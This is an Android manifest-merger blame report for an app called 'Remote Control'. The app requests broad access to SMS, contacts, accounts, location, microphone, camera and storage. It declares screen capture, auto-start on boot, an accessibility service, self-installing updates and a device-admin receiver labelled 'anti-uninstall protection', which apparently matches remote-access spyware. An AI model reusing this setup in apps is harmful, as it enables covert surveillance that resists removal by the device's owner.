android-app/app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.remote.control"
4    android:versionCode="1"
5    android:versionName="2.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src\main\AndroidManifest.xml:4:5-67
11-->src\main\AndroidManifest.xml:4:22-64
12    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
12-->src\main\AndroidManifest.xml:5:5-77
12-->src\main\AndroidManifest.xml:5:22-74
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
13-->src\main\AndroidManifest.xml:6:5-94
13-->src\main\AndroidManifest.xml:6:22-91
14    <uses-permission android:name="android.permission.WAKE_LOCK" />
14-->src\main\AndroidManifest.xml:7:5-68
14-->src\main\AndroidManifest.xml:7:22-65
15    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
15-->src\main\AndroidManifest.xml:8:5-77
15-->src\main\AndroidManifest.xml:8:22-74
16    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
16-->src\main\AndroidManifest.xml:9:5-80
16-->src\main\AndroidManifest.xml:9:22-77
17    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
17-->src\main\AndroidManifest.xml:10:5-81
17-->src\main\AndroidManifest.xml:10:22-78
18    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
18-->src\main\AndroidManifest.xml:11:5-82
18-->src\main\AndroidManifest.xml:11:22-79
19    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
19-->src\main\AndroidManifest.xml:12:5-81
19-->src\main\AndroidManifest.xml:12:22-78
20    <uses-permission android:name="android.permission.READ_CONTACTS" />
20-->src\main\AndroidManifest.xml:13:5-72
20-->src\main\AndroidManifest.xml:13:22-69
21    <uses-permission android:name="android.permission.READ_SMS" />
21-->src\main\AndroidManifest.xml:14:5-67
21-->src\main\AndroidManifest.xml:14:22-64
22    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
22-->src\main\AndroidManifest.xml:15:5-79
22-->src\main\AndroidManifest.xml:15:22-76
23    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
23-->src\main\AndroidManifest.xml:16:5-81
23-->src\main\AndroidManifest.xml:16:22-78
24    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
24-->src\main\AndroidManifest.xml:17:5-85
24-->src\main\AndroidManifest.xml:17:22-82
25    <uses-permission android:name="android.permission.RECORD_AUDIO" />
25-->src\main\AndroidManifest.xml:18:5-71
25-->src\main\AndroidManifest.xml:18:22-68
26    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
26-->src\main\AndroidManifest.xml:19:5-71
26-->src\main\AndroidManifest.xml:19:22-68
27    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
27-->src\main\AndroidManifest.xml:20:5-83
27-->src\main\AndroidManifest.xml:20:22-80
28    <uses-permission android:name="android.permission.CAMERA" />
28-->src\main\AndroidManifest.xml:21:5-65
28-->src\main\AndroidManifest.xml:21:22-62
29
30    <uses-feature
30-->src\main\AndroidManifest.xml:22:5-85
31        android:name="android.hardware.camera"
31-->src\main\AndroidManifest.xml:22:19-57
32        android:required="false" />
32-->src\main\AndroidManifest.xml:22:58-82
33    <uses-feature
33-->src\main\AndroidManifest.xml:23:5-89
34        android:name="android.hardware.microphone"
34-->src\main\AndroidManifest.xml:23:19-61
35        android:required="false" />
35-->src\main\AndroidManifest.xml:23:62-86
36
37    <permission
37-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
38        android:name="com.remote.control.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
38-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
39        android:protectionLevel="signature" />
39-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
40
41    <uses-permission android:name="com.remote.control.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
41-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
41-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
42
43    <application
43-->src\main\AndroidManifest.xml:25:5-104:19
44        android:allowBackup="true"
44-->src\main\AndroidManifest.xml:26:9-35
45        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
45-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
46        android:debuggable="true"
47        android:extractNativeLibs="false"
48        android:icon="@android:drawable/ic_menu_view"
48-->src\main\AndroidManifest.xml:27:9-54
49        android:label="Remote Control"
49-->src\main\AndroidManifest.xml:28:9-39
50        android:supportsRtl="true"
50-->src\main\AndroidManifest.xml:29:9-35
51        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar"
51-->src\main\AndroidManifest.xml:30:9-68
52        android:usesCleartextTraffic="true" >
52-->src\main\AndroidManifest.xml:31:9-44
53        <activity
53-->src\main\AndroidManifest.xml:33:9-49:20
54            android:name="com.remote.control.MainActivity"
54-->src\main\AndroidManifest.xml:34:13-41
55            android:exported="true"
55-->src\main\AndroidManifest.xml:35:13-36
56            android:launchMode="singleTask"
56-->src\main\AndroidManifest.xml:37:13-44
57            android:screenOrientation="portrait" >
57-->src\main\AndroidManifest.xml:36:13-49
58            <intent-filter>
58-->src\main\AndroidManifest.xml:38:13-41:29
59                <action android:name="android.intent.action.MAIN" />
59-->src\main\AndroidManifest.xml:39:17-69
59-->src\main\AndroidManifest.xml:39:25-66
60
61                <category android:name="android.intent.category.LAUNCHER" />
61-->src\main\AndroidManifest.xml:40:17-77
61-->src\main\AndroidManifest.xml:40:27-74
62            </intent-filter>
63            <!-- Deep link: auto-connect when opened from browser -->
64            <intent-filter android:autoVerify="true" >
64-->src\main\AndroidManifest.xml:43:13-48:29
64-->src\main\AndroidManifest.xml:43:28-53
65                <action android:name="android.intent.action.VIEW" />
65-->src\main\AndroidManifest.xml:44:17-69
65-->src\main\AndroidManifest.xml:44:25-66
66
67                <category android:name="android.intent.category.DEFAULT" />
67-->src\main\AndroidManifest.xml:45:17-76
67-->src\main\AndroidManifest.xml:45:27-73
68                <category android:name="android.intent.category.BROWSABLE" />
68-->src\main\AndroidManifest.xml:46:17-78
68-->src\main\AndroidManifest.xml:46:27-75
69
70                <data android:scheme="remotecontrol" />
70-->src\main\AndroidManifest.xml:47:17-56
70-->src\main\AndroidManifest.xml:47:23-53
71            </intent-filter>
72        </activity>
73
74        <service
74-->src\main\AndroidManifest.xml:51:9-54:40
75            android:name="com.remote.control.ScreenCaptureService"
75-->src\main\AndroidManifest.xml:52:13-49
76            android:exported="false"
76-->src\main\AndroidManifest.xml:54:13-37
77            android:foregroundServiceType="mediaProjection" />
77-->src\main\AndroidManifest.xml:53:13-60
78
79        <!-- Boot receiver for auto-start after reboot -->
80        <receiver
80-->src\main\AndroidManifest.xml:57:9-66:20
81            android:name="com.remote.control.BootReceiver"
81-->src\main\AndroidManifest.xml:58:13-41
82            android:enabled="true"
82-->src\main\AndroidManifest.xml:60:13-35
83            android:exported="true" >
83-->src\main\AndroidManifest.xml:59:13-36
84            <intent-filter>
84-->src\main\AndroidManifest.xml:61:13-65:29
85                <action android:name="android.intent.action.BOOT_COMPLETED" />
85-->src\main\AndroidManifest.xml:62:17-79
85-->src\main\AndroidManifest.xml:62:25-76
86                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
86-->src\main\AndroidManifest.xml:63:17-82
86-->src\main\AndroidManifest.xml:63:25-79
87                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
87-->src\main\AndroidManifest.xml:64:17-84
87-->src\main\AndroidManifest.xml:64:25-81
88            </intent-filter>
89        </receiver>
90
91        <!-- Device Admin for anti-uninstall protection -->
92        <receiver
92-->src\main\AndroidManifest.xml:69:9-79:20
93            android:name="com.remote.control.DeviceAdminReceiver"
93-->src\main\AndroidManifest.xml:70:13-48
94            android:exported="true"
94-->src\main\AndroidManifest.xml:72:13-36
95            android:permission="android.permission.BIND_DEVICE_ADMIN" >
95-->src\main\AndroidManifest.xml:71:13-70
96            <meta-data
96-->src\main\AndroidManifest.xml:73:13-75:65
97                android:name="android.app.device_admin"
97-->src\main\AndroidManifest.xml:74:17-56
98                android:resource="@xml/device_admin_policies" />
98-->src\main\AndroidManifest.xml:75:17-62
99
100            <intent-filter>
100-->src\main\AndroidManifest.xml:76:13-78:29
101                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
101-->src\main\AndroidManifest.xml:77:17-82
101-->src\main\AndroidManifest.xml:77:25-79
102            </intent-filter>
103        </receiver>
104
105        <service
105-->src\main\AndroidManifest.xml:81:9-91:19
106            android:name="com.remote.control.RemoteControlService"
106-->src\main\AndroidManifest.xml:82:13-49
107            android:exported="true"
107-->src\main\AndroidManifest.xml:84:13-36
108            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
108-->src\main\AndroidManifest.xml:83:13-79
109            <intent-filter>
109-->src\main\AndroidManifest.xml:85:13-87:29
110                <action android:name="android.accessibilityservice.AccessibilityService" />
110-->src\main\AndroidManifest.xml:86:17-92
110-->src\main\AndroidManifest.xml:86:25-89
111            </intent-filter>
112
113            <meta-data
113-->src\main\AndroidManifest.xml:88:13-90:64
114                android:name="android.accessibilityservice"
114-->src\main\AndroidManifest.xml:89:17-60
115                android:resource="@xml/accessibility_config" />
115-->src\main\AndroidManifest.xml:90:17-61
116        </service>
117
118        <!-- FileProvider for APK auto-update installation -->
119        <provider
120            android:name="androidx.core.content.FileProvider"
120-->src\main\AndroidManifest.xml:95:13-62
121            android:authorities="com.remote.control.fileprovider"
121-->src\main\AndroidManifest.xml:96:13-64
122            android:exported="false"
122-->src\main\AndroidManifest.xml:97:13-37
123            android:grantUriPermissions="true" >
123-->src\main\AndroidManifest.xml:98:13-47
124            <meta-data
124-->src\main\AndroidManifest.xml:99:13-101:54
125                android:name="android.support.FILE_PROVIDER_PATHS"
125-->src\main\AndroidManifest.xml:100:17-67
126                android:resource="@xml/file_paths" />
126-->src\main\AndroidManifest.xml:101:17-51
127        </provider>
128        <provider
128-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
129            android:name="androidx.startup.InitializationProvider"
129-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
130            android:authorities="com.remote.control.androidx-startup"
130-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
131            android:exported="false" >
131-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
132            <meta-data
132-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
133                android:name="androidx.emoji2.text.EmojiCompatInitializer"
133-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
134                android:value="androidx.startup" />
134-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
135            <meta-data
135-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
136                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
136-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
137                android:value="androidx.startup" />
137-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
138            <meta-data
138-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
139                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
139-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
140                android:value="androidx.startup" />
140-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
141        </provider>
142
143        <receiver
143-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
144            android:name="androidx.profileinstaller.ProfileInstallReceiver"
144-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
145            android:directBootAware="false"
145-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
146            android:enabled="true"
146-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
147            android:exported="true"
147-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
148            android:permission="android.permission.DUMP" >
148-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
149            <intent-filter>
149-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
150                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
150-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
150-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
151            </intent-filter>
152            <intent-filter>
152-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
153                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
153-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
153-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
154            </intent-filter>
155            <intent-filter>
155-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
156                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
156-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
156-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
157            </intent-filter>
158            <intent-filter>
158-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
159                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
159-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
159-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
160            </intent-filter>
161        </receiver>
162    </application>
163
164</manifest>